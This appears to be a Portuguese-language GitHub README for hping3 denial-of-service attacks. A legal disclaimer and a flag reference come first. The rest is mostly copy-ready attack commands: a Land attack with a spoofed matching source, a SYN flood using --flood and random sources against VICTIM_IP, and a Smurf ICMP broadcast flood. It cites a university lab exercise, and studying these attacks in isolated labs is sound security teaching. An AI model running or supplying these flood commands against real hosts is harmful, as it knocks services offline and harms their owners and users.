# Hping3-DDoS

## AVISO
- Não me responsabilizo pelo o uso desses projetos/códigos para fins malignos. Eles são criados para pessoas que tenham interesse na área de Segurança da Informação.

- Todos os códigos e projetos foram testados em ambientes isolados por mim.

- Lembrem-se de que usar essas informações para hackear, invadir ou derrubar serviços de dispositivos alheios é CRIME previsto na Lei [14.155/2021](http://www.planalto.gov.br/ccivil_03/_ato2019-2022/2021/lei/L14155.htm).

## Install
```
$ sudo apt install hping3
```


## Important Commands

- Help hping3

```
$ sudo hping3 -h
```

```
• -V: Modo Verbose;
• -c: Contador de pacotes;
• -d: Tamanho do dado;
• -p: Porta de destino;
• -s: Porta de origem;
• –rand-source: Randomização da origem;
• –fast: 10 pacotes por segundo;
• –faster: 100 pacotes por segundo;
• –flood: Máximo de pacotes possı́veis por segundo;
```

```
Mode
  default mode     TCP
  -0  --rawip      RAW IP mode
  -1  --icmp       ICMP mode
  -2  --udp        UDP mode
  -8  --scan       SCAN mode.
                   Example: hping --scan 1-30,70-90 -S www.target.host
  -9  --listen     listen mode

```

## Attack DoS Land
```
$ sudo hping3 -V -c 1000 -d 100 -S -p 21 -s 80 -k -a 192.168.1.110 192.168.1.110
```

## DoS type Syn Flooding
```
$ sudo hping3 -V -c 1000000 -d 120 -S -p 445 -s 445 --flood --rand-source VICTIM_IP
```

## Attack DoS Smurf:
```
$ sudo hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS
```

## References
- http://docente.ifrn.edu.br/josemacedo/disciplinas/2019/2019.1/praticas-de-laboratorio/03-simulando-ataques-dos-com-hping